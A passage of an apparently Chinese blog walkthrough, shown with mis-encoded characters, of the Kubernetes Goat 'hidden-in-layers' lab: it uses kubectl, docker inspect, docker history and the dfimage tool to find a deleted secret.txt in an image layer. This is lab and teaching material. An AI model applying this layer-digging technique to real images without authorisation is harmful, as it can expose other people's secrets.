<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-23%2009.37.40.png" style="zoom:30%;">

<p>åˆ†æçš„ç›®æ ‡æ˜¯<code>hidden-in-layers</code>è¿™ä¸ªjobã€‚</p>
<p>ç›®æ ‡ï¼šåœ¨ç›®æ ‡å®¹å™¨çš„ä¸€ä¸ªéšè—å±‚ä¸­æ‰¾åˆ°<code>k8s_goat_flag</code>ã€‚</p>
<h3 id="3-9-3-åœºæ™¯å®è·µ"><a href="#3-9-3-åœºæ™¯å®è·µ" class="headerlink" title="3.9.3 åœºæ™¯å®è·µ"></a>3.9.3 åœºæ™¯å®è·µ</h3><h4 id="1ï¼‰åˆ†æjobå…³è”çš„é•œåƒ"><a href="#1ï¼‰åˆ†æjobå…³è”çš„é•œåƒ" class="headerlink" title="1ï¼‰åˆ†æjobå…³è”çš„é•œåƒ"></a>1ï¼‰åˆ†æjobå…³è”çš„é•œåƒ</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">kubectl describe job hidden-in-layers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-23%2009.45.15.png" style="zoom:50%;">

<p>é•œåƒä¸ºï¼š<code>docker.io/madhuakula/k8s-goat-hidden-in-layers</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> inspect docker.io/madhuakula/k8s-goat-hidden-in-layers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p>å‘½ä»¤çš„ä½œç”¨æ˜¯ <strong>æŸ¥çœ‹æŒ‡å®šDockeré•œåƒçš„è¯¦ç»†å…ƒæ•°æ®å’Œé…ç½®ä¿¡æ¯</strong></p>
<ul>
<li><strong><code>docker inspect</code></strong>: Dockerå†…ç½®å‘½ä»¤ï¼Œç”¨äºè·å–å®¹å™¨æˆ–é•œåƒçš„åº•å±‚è¯¦ç»†ä¿¡æ¯ï¼ˆJSONæ ¼å¼ï¼‰ã€‚</li>
<li><strong><code>docker.io/madhuakula/k8s-goat-hidden-in-layers</code></strong>: ç›®æ ‡é•œåƒåç§°ï¼Œæ ¼å¼ä¸º<code>&lt;ä»“åº“&gt;/&lt;ç”¨æˆ·å&gt;/&lt;é•œåƒå&gt;:&lt;æ ‡ç­¾&gt;</code>ï¼ˆæ­¤å¤„æœªæŒ‡å®šæ ‡ç­¾ï¼Œé»˜è®¤ä½¿ç”¨<code>latest</code>ï¼‰ã€‚</li>
</ul>
</blockquote>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sxk@sxk-virtual-machine:~/Desktop/myimages$ <span class="token function">docker</span> inspect docker.io/madhuakula/k8s-goat-hidden-in-layers
<span class="token punctuation">[</span>
    <span class="token punctuation">{</span>
        <span class="token string">"Id"</span><span class="token builtin class-name">:</span> <span class="token string">"sha256:285cbdc185fff63b1df260afade65d85fa3be199bba280f8936fdb303f88b14f"</span>,
        <span class="token string">"RepoTags"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>
            <span class="token string">"madhuakula/k8s-goat-hidden-in-layers:latest"</span>
        <span class="token punctuation">]</span>,
        <span class="token string">"RepoDigests"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>,
        <span class="token string">"Parent"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,
        <span class="token string">"Comment"</span><span class="token builtin class-name">:</span> <span class="token string">"buildkit.dockerfile.v0"</span>,
        <span class="token string">"Created"</span><span class="token builtin class-name">:</span> <span class="token string">"2023-12-06T00:19:26.593122798Z"</span>,
        <span class="token string">"Container"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,
        <span class="token string">"ContainerConfig"</span><span class="token builtin class-name">:</span> <span class="token punctuation">{</span>
            <span class="token string">"Hostname"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,
            <span class="token string">"Domainname"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,
            <span class="token string">"User"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,
            <span class="token string">"AttachStdin"</span><span class="token builtin class-name">:</span> false,
            <span class="token string">"AttachStdout"</span><span class="token builtin class-name">:</span> false,
            <span class="token string">"AttachStderr"</span><span class="token builtin class-name">:</span> false,
            <span class="token string">"Tty"</span><span class="token builtin class-name">:</span> false,
            <span class="token string">"OpenStdin"</span><span class="token builtin class-name">:</span> false,
            <span class="token string">"StdinOnce"</span><span class="token builtin class-name">:</span> false,
            <span class="token string">"Env"</span><span class="token builtin class-name">:</span> null,
            <span class="token string">"Cmd"</span><span class="token builtin class-name">:</span> null,
            <span class="token string">"Image"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,
            <span class="token string">"Volumes"</span><span class="token builtin class-name">:</span> null,
            <span class="token string">"WorkingDir"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,
            <span class="token string">"Entrypoint"</span><span class="token builtin class-name">:</span> null,
            <span class="token string">"OnBuild"</span><span class="token builtin class-name">:</span> null,
            <span class="token string">"Labels"</span><span class="token builtin class-name">:</span> null
        <span class="token punctuation">}</span>,
        <span class="token string">"DockerVersion"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,
        <span class="token string">"Author"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,
        <span class="token string">"Config"</span><span class="token builtin class-name">:</span> <span class="token punctuation">{</span>
            <span class="token string">"Hostname"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,
            <span class="token string">"Domainname"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,
            <span class="token string">"User"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,
            <span class="token string">"AttachStdin"</span><span class="token builtin class-name">:</span> false,
            <span class="token string">"AttachStdout"</span><span class="token builtin class-name">:</span> false,
            <span class="token string">"AttachStderr"</span><span class="token builtin class-name">:</span> false,
            <span class="token string">"Tty"</span><span class="token builtin class-name">:</span> false,
            <span class="token string">"OpenStdin"</span><span class="token builtin class-name">:</span> false,
            <span class="token string">"StdinOnce"</span><span class="token builtin class-name">:</span> false,
            <span class="token string">"Env"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>
                <span class="token string">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>
            <span class="token punctuation">]</span>,
            <span class="token string">"Cmd"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>
                <span class="token string">"sh"</span>,
                <span class="token string">"-c"</span>,
                <span class="token string">"tail -f /dev/null"</span>
            <span class="token punctuation">]</span>,
            <span class="token string">"ArgsEscaped"</span><span class="token builtin class-name">:</span> true,
            <span class="token string">"Image"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,
            <span class="token string">"Volumes"</span><span class="token builtin class-name">:</span> null,
            <span class="token string">"WorkingDir"</span><span class="token builtin class-name">:</span> <span class="token string">""</span>,
            <span class="token string">"Entrypoint"</span><span class="token builtin class-name">:</span> null,
            <span class="token string">"OnBuild"</span><span class="token builtin class-name">:</span> null,
            <span class="token string">"Labels"</span><span class="token builtin class-name">:</span> <span class="token punctuation">{</span>
                <span class="token string">"MAINTAINER"</span><span class="token builtin class-name">:</span> <span class="token string">"Madhu Akula INFO=Kubernetes Goat"</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>,
        <span class="token string">"Architecture"</span><span class="token builtin class-name">:</span> <span class="token string">"amd64"</span>,
        <span class="token string">"Os"</span><span class="token builtin class-name">:</span> <span class="token string">"linux"</span>,
        <span class="token string">"Size"</span><span class="token builtin class-name">:</span> <span class="token number">7339528</span>,
        <span class="token string">"VirtualSize"</span><span class="token builtin class-name">:</span> <span class="token number">7339528</span>,
        <span class="token string">"GraphDriver"</span><span class="token builtin class-name">:</span> <span class="token punctuation">{</span>
            <span class="token string">"Data"</span><span class="token builtin class-name">:</span> <span class="token punctuation">{</span>
                <span class="token string">"LowerDir"</span><span class="token builtin class-name">:</span> <span class="token string">"/var/lib/docker/overlay2/9290aa340b81543af719a8c2880ffa1e253cc836b2fa7a55cdbd606285d49195/diff:/var/lib/docker/overlay2/a8126ebb341354293f52bc7d49ca67be8aae00d206590a45aa0b81958ad3e6c5/diff"</span>,
                <span class="token string">"MergedDir"</span><span class="token builtin class-name">:</span> <span class="token string">"/var/lib/docker/overlay2/4c95b72b566e2aeb9d6b3822d1bda255117c8ae88dbbb0abf5344df8e7c3024c/merged"</span>,
                <span class="token string">"UpperDir"</span><span class="token builtin class-name">:</span> <span class="token string">"/var/lib/docker/overlay2/4c95b72b566e2aeb9d6b3822d1bda255117c8ae88dbbb0abf5344df8e7c3024c/diff"</span>,
                <span class="token string">"WorkDir"</span><span class="token builtin class-name">:</span> <span class="token string">"/var/lib/docker/overlay2/4c95b72b566e2aeb9d6b3822d1bda255117c8ae88dbbb0abf5344df8e7c3024c/work"</span>
            <span class="token punctuation">}</span>,
            <span class="token string">"Name"</span><span class="token builtin class-name">:</span> <span class="token string">"overlay2"</span>
        <span class="token punctuation">}</span>,
        <span class="token string">"RootFS"</span><span class="token builtin class-name">:</span> <span class="token punctuation">{</span>
            <span class="token string">"Type"</span><span class="token builtin class-name">:</span> <span class="token string">"layers"</span>,
            <span class="token string">"Layers"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>
                <span class="token string">"sha256:9fe9a137fd002363ac64f5af66146702432b638a83ee0c5b620c40a9e433e813"</span>,
                <span class="token string">"sha256:aeb19cbfb884f9254a78d91b48306eae800bf7c0288a74f83a62049f4ac14fa2"</span>,
                <span class="token string">"sha256:85eff0a7c72498d687e462158c1d4b9b80edc24254ea07e50e27e00d9923c8e2"</span>
            <span class="token punctuation">]</span>
        <span class="token punctuation">}</span>,
        <span class="token string">"Metadata"</span><span class="token builtin class-name">:</span> <span class="token punctuation">{</span>
            <span class="token string">"LastTagTime"</span><span class="token builtin class-name">:</span> <span class="token string">"0001-01-01T00:00:00Z"</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">]</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å…³é”®é…ç½®ä¿¡æ¯ï¼š</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token string">"Env"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>
                <span class="token string">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>
       <span class="token punctuation">]</span>,
<span class="token string">"Cmd"</span><span class="token builtin class-name">:</span> <span class="token punctuation">[</span>
                <span class="token string">"sh"</span>,
                <span class="token string">"-c"</span>,
                <span class="token string">"tail -f /dev/null"</span>
        <span class="token punctuation">]</span>,<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿä¸Šè¿°è¾“å‡ºä¸­çš„cmdéƒ¨åˆ†ã€‚å®ƒæ˜¾ç¤ºäº†è¿™ä¸ªé•œåƒåœ¨å¯åŠ¨æ—¶æ‰§è¡Œçš„é»˜è®¤å‘½ä»¤ã€‚è™½ç„¶è¿™æ˜¾ç¤ºäº†ä¸€äº›æœ‰è¶£çš„ä¿¡æ¯ï¼Œä½†å¯¹æˆ‘ä»¬æ¥è¯´è¿˜ä¸å¤Ÿå¤šã€‚</p>
<p>å¦‚æœæˆ‘ä»¬äº†è§£è¿™ä¸ªé•œåƒæ˜¯å¦‚ä½•ä»é›¶å¼€å§‹æ„å»ºçš„ï¼Œä¹Ÿè®¸ä¼šå¯¹æˆ‘ä»¬æ›´æœ‰å¸®åŠ©ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦åˆ†æé•œåƒçš„Dockerfileã€‚å¦‚æœä½ æœ‰Dockerfileè‡ªç„¶å¾ˆå¥½ï¼Œä½†æ˜¯å¦‚æœæ²¡æœ‰ï¼Œæœ‰å‡ ç§æ–¹æ³•å¯ä»¥åˆ†æå®ƒã€‚</p>
<h4 id="2ï¼‰åˆ†æé•œåƒå±‚"><a href="#2ï¼‰åˆ†æé•œåƒå±‚" class="headerlink" title="2ï¼‰åˆ†æé•œåƒå±‚"></a>2ï¼‰åˆ†æé•œåƒå±‚</h4><ul>
<li>æ–¹æ³•1:docker history</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> <span class="token function">history</span> --no-trunc madhuakula/k8s-goat-hidden-in-layers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<p><strong>æŸ¥çœ‹æŒ‡å®š Docker é•œåƒçš„æ„å»ºå†å²ï¼ˆå„å±‚æŒ‡ä»¤çš„å®Œæ•´å‘½ä»¤ï¼‰</strong>ï¼Œç”¨äºåˆ†æé•œåƒçš„æ„å»ºè¿‡ç¨‹ã€ä¾èµ–é¡¹åŠæ½œåœ¨é—®é¢˜ã€‚</p>
</blockquote>
<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-23%2010.01.56.png" style="zoom:50%;">

<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sxk@sxk-virtual-machine:~/Desktop/myimages$ <span class="token function">docker</span> <span class="token function">history</span> --no-trunc madhuakula/k8s-goat-hidden-in-layers
IMAGE                                                                     CREATED         CREATED BY                                                                                                              SIZE      COMMENT


sha256:285cbdc185fff63b1df260afade65d85fa3be199bba280f8936fdb303f88b14f   <span class="token number">17</span> months ago   CMD <span class="token punctuation">[</span><span class="token string">"sh"</span> <span class="token string">"-c"</span> <span class="token string">"tail -f /dev/null"</span><span class="token punctuation">]</span>                                                                                     0B        buildkit.dockerfile.v0



<span class="token operator">&lt;</span>missing<span class="token operator">&gt;</span>                                                                 <span class="token number">17</span> months ago   RUN /bin/sh <span class="token parameter variable">-c</span> <span class="token builtin class-name">echo</span> <span class="token string">"Contributed by Rewanth Cool"</span> <span class="token operator">&gt;&gt;</span> /root/contribution.txt     <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> /root/secret.txt <span class="token comment"># buildkit   28B       buildkit.dockerfile.v0</span>



<span class="token operator">&lt;</span>missing<span class="token operator">&gt;</span>                                                                 <span class="token number">17</span> months ago   ADD secret.txt /root/secret.txt <span class="token comment"># buildkit                                                                              41B       buildkit.dockerfile.v0</span>



<span class="token operator">&lt;</span>missing<span class="token operator">&gt;</span>                                                                 <span class="token number">17</span> months ago   LABEL <span class="token assign-left variable">MAINTAINER</span><span class="token operator">=</span>Madhu Akula <span class="token assign-left variable">INFO</span><span class="token operator">=</span>Kubernetes Goat                                                                       0B        buildkit.dockerfile.v0


<span class="token operator">&lt;</span>missing<span class="token operator">&gt;</span>                                                                 <span class="token number">17</span> months ago   /bin/sh <span class="token parameter variable">-c</span> <span class="token comment">#(nop)  CMD ["/bin/sh"]                                                                                      0B        </span>


<span class="token operator">&lt;</span>missing<span class="token operator">&gt;</span>                                                                 <span class="token number">17</span> months ago   /bin/sh <span class="token parameter variable">-c</span> <span class="token comment">#(nop) ADD file:fc714080c3bcbbce7ac746a10d7b4355ffa36293a8d435d62cd5359ea8eb8364 in /                        7.34MB    </span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ•æ„Ÿä¿¡æ¯å¦‚ï¼š</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ADD secret.txt /root/secret.txt
RUN /bin/sh <span class="token parameter variable">-c</span> <span class="token builtin class-name">echo</span> <span class="token string">"Contributed by Rewanth Cool"</span> <span class="token operator">&gt;&gt;</span> /root/contribution.txt  <span class="token operator">&amp;&amp;</span> <span class="token function">rm</span> <span class="token parameter variable">-rf</span> /root/secret.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<ul>
<li>æ–¹æ³•2:dfimage</li>
</ul>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">alias</span> <span class="token assign-left variable">dfimage</span><span class="token operator">=</span><span class="token string">"docker run -v /var/run/docker.sock:/var/run/docker.sock --rm alpine/dfimage"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<h4 id="å‘½ä»¤è§£æï¼š"><a href="#å‘½ä»¤è§£æï¼š" class="headerlink" title="å‘½ä»¤è§£æï¼š"></a>å‘½ä»¤è§£æï¼š</h4><p>è¿™æ¡å‘½ä»¤çš„ä½œç”¨æ˜¯ <strong>é€šè¿‡å®¹å™¨åŒ–çš„å·¥å…· <code>dfimage</code> é€†å‘åˆ†æ Docker é•œåƒçš„æ„å»ºå†å²</strong>ï¼Œå°¤å…¶é€‚ç”¨äºä¸¢å¤± Dockerfile æ—¶å¿«é€Ÿè¿˜åŸé•œåƒçš„æ„å»ºæ­¥éª¤ã€‚</p>
<table>
<thead>
<tr>
<th align="center"><strong>å‘½ä»¤éƒ¨åˆ†</strong></th>
<th align="center"><strong>ä½œç”¨</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>alias dfimage=</code></td>
<td align="center">ä¸ºåç»­çš„é•¿å‘½ä»¤åˆ›å»ºåˆ«å <code>dfimage</code>ï¼Œç®€åŒ–æ“ä½œã€‚</td>
</tr>
<tr>
<td align="center"><code>docker run</code></td>
<td align="center">å¯åŠ¨ä¸€ä¸ªæ–°çš„å®¹å™¨ã€‚</td>
</tr>
<tr>
<td align="center"><code>-v /var/run/docker.sock:/var/run/docker.sock</code></td>
<td align="center">æŒ‚è½½å®¿ä¸»æœºçš„ Docker å¥—æ¥å­—åˆ°å®¹å™¨å†…ï¼Œä½¿å®¹å™¨èƒ½æ“ä½œå®¿ä¸»æœºçš„ Docker å®ˆæŠ¤è¿›ç¨‹ã€‚</td>
</tr>
<tr>
<td align="center"><code>--rm</code></td>
<td align="center">å®¹å™¨é€€å‡ºåè‡ªåŠ¨åˆ é™¤ï¼Œé¿å…æ®‹ç•™ä¸´æ—¶å®¹å™¨ã€‚</td>
</tr>
<tr>
<td align="center"><code>alpine/dfimage</code></td>
<td align="center">ä½¿ç”¨åŒ…å« <code>dfimage</code> å·¥å…·çš„ Alpine Linux é•œåƒã€‚</td>
</tr>
<tr>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>
<p> <strong><code>dfimage</code> å·¥å…·</strong></p>
<p><code>dfimage</code> æ˜¯ä¸€ä¸ªç”¨äºåˆ†æ Docker é•œåƒæ„å»ºå†å²çš„å·¥å…·ï¼Œå…¶æ ¸å¿ƒåŠŸèƒ½åŒ…æ‹¬ï¼š</p>
<ul>
<li><strong>é€†å‘ç”Ÿæˆè¿‘ä¼¼ Dockerfile</strong>ï¼šé€šè¿‡é•œåƒçš„åˆ†å±‚å…ƒæ•°æ®ï¼Œè¿˜åŸé•œåƒæ„å»ºæ—¶çš„å‘½ä»¤ï¼ˆå¦‚ <code>RUN</code>ã€<code>COPY</code> ç­‰ï¼‰ã€‚</li>
<li><strong>æ˜¾ç¤ºæ¯å±‚æ“ä½œ</strong>ï¼šåˆ—å‡ºæ¯ä¸ªé•œåƒå±‚æ·»åŠ /ä¿®æ”¹çš„æ–‡ä»¶åŠæ‰§è¡Œçš„å‘½ä»¤ã€‚</li>
<li><strong>è°ƒè¯•é•œåƒæ„å»º</strong>ï¼šå®šä½é•œåƒä½“ç§¯è¿‡å¤§æˆ–åŒ…å«æ•æ„Ÿæ–‡ä»¶çš„å±‚çº§ã€‚</li>
</ul>
</blockquote>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dfimage <span class="token parameter variable">-sV</span><span class="token operator">=</span><span class="token number">1.36</span> madhuakula/k8s-goat-hidden-in-layers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<blockquote>
<h4 id="å‘½ä»¤è§£æï¼š-1"><a href="#å‘½ä»¤è§£æï¼š-1" class="headerlink" title="å‘½ä»¤è§£æï¼š"></a>å‘½ä»¤è§£æï¼š</h4><p>è¿™æ¡å‘½ä»¤çš„ä½œç”¨æ˜¯ <strong>é€šè¿‡æŒ‡å®š Docker API ç‰ˆæœ¬ï¼ˆ1.36ï¼‰å¯¹ç›®æ ‡é•œåƒè¿›è¡Œæ·±åº¦é€†å‘åˆ†æ</strong></p>
<table>
<thead>
<tr>
<th align="center"><strong>å‚æ•°/ç»„ä»¶</strong></th>
<th align="center"><strong>ä½œç”¨</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>dfimage</code></td>
<td align="center">åŸºäºå®¹å™¨åŒ–çš„é•œåƒåˆ†æå·¥å…·ï¼ˆå®ä¸º <code>alpine/dfimage</code> çš„åˆ«åï¼‰ã€‚</td>
</tr>
<tr>
<td align="center"><strong><code>-sV=1.36</code></strong></td>
<td align="center">æŒ‡å®š Docker API ç‰ˆæœ¬ä¸º <code>1.36</code>ï¼ˆå…³é”®è°ƒè¯•å‚æ•°ï¼Œè§£å†³å…¼å®¹æ€§é—®é¢˜ï¼‰ã€‚</td>
</tr>
<tr>
<td align="center"><code>madhuakula/k8s-goat-hidden-in-layers</code></td>
<td align="center">ç›®æ ‡é•œåƒåç§°ï¼Œå±äº Kubernetes Goat é¡¹ç›®ä¸­ç”¨äºæ¼”ç¤ºéšè—æ¼æ´çš„é•œåƒã€‚</td>
</tr>
</tbody></table>
</blockquote>
<blockquote>
<h4 id="è§£å†³dfimageé•œåƒæ‹‰å–å¤±è´¥çš„é—®é¢˜"><a href="#è§£å†³dfimageé•œåƒæ‹‰å–å¤±è´¥çš„é—®é¢˜" class="headerlink" title="è§£å†³dfimageé•œåƒæ‹‰å–å¤±è´¥çš„é—®é¢˜"></a>è§£å†³dfimageé•œåƒæ‹‰å–å¤±è´¥çš„é—®é¢˜</h4><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2025/05/07/yun-an-quan-gong-fang/k8s-yun-yuan-sheng-an-quan-gong-fang-shi-jian/%E6%88%AA%E5%B1%8F2025-05-23%2010.28.59.png" style="zoom:50%;">

<ul>
